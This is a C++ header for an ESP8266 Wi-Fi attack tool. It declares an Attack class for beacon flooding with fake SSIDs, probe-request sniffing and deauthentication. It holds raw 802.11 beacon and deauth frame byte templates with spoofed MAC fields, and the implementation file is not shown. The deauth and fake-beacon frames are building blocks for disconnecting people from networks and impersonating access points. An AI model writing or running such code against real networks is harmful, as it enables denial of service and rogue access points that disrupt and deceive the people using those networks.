#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <LittleFS.h>

class Attack
{
public:
    Attack();
    // Beacon
    void startBeacon();
    void stopBeacon();
    bool loadSSIDs(const char *filename);

    // Probe
    void handleProbePacket(uint8_t *buff, uint16_t len);
    static void static_sniffer_callback(uint8_t *buff, uint16_t len);

    // Deauth
    void startDeauth(uint8_t bssid[], uint8_t clientMac[], int channel); 
    void sendDeauthFrame(uint8_t targetAPMAC[6], uint8_t targetClientMAC[6]);

private:
    static Attack *instance;
    struct AttackType
    {
        bool active = false;
        uint16_t packetCounter = 0;
    };
    // Beacon Stuff
    uint8_t mac[6] = {0xAA, 0xBB, 0xCC, 0x00, 0x11, 0x22};
    std::vector<String> ssids;
    uint8_t beaconPacket[109] = {
        /* 0 -  3 */ 0x80, 0x00, 0x00, 0x00,
        /* 4 -  9 */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        /* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
        /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,
        /* 22 - 23 */ 0x00, 0x00,
        /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00,
        /* 32 - 33 */ 0x64, 0x00,
        /* 34 - 35 */ 0x31, 0x00,
        /* 36 - 37 */ 0x00, 0x20,
        /* 38 - 69 */ 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
        0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
        0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
        0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20, 0x20,
        /* 70 - 71 */ 0x01, 0x08,
        /* 72 - 79 */ 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c,
        /* 80 - 81 */ 0x03, 0x01,
        /* 82      */ 0x01,
        /* 83 - 108*/ 0x30, 0x18, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02,
        0x02, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f,
        0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02,
        0x00, 0x00};
    AttackType beacon;

    // Probe Stuff
    typedef struct
    {
        unsigned frame_ctrl : 16;
        unsigned duration_id : 16;
        uint8_t addr1[6]; // Reciver
        uint8_t addr2[6]; // Sender
        uint8_t addr3[6]; // BSSID
        unsigned sequence_ctrl : 16;
        uint8_t addr4[6];
    } wifi_mgmt_hdr_t;

    typedef struct
    {
        wifi_mgmt_hdr_t hdr;
        uint8_t payload[0];
    } wifi_promiscuous_pkt_t;
    AttackType probe_t;

    // Deauth
    uint8_t deauth_packet[26] = {
        /* 0 -  1  */ 0xC0, 0x00,                          // Type/Subtype: Deauthentication
        /* 2 -  3  */ 0x00, 0x00,                          // Duration (will be ignored)
        /* 4 -  9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination: The Client's MAC address
        /* 10 - 15  */ 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, // Source: The AP's MAC address (BSSID)
        /* 16 - 21  */ 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF, // BSSID: The AP's MAC address
        /* 22 - 23  */ 0x00, 0x00,                         // Fragment & Sequence number
        /* 24 - 25  */ 0x07, 0x00                          // Reason Code: 7 = Class 3 frame received from nonassociated STA
    };
    AttackType deauth;
};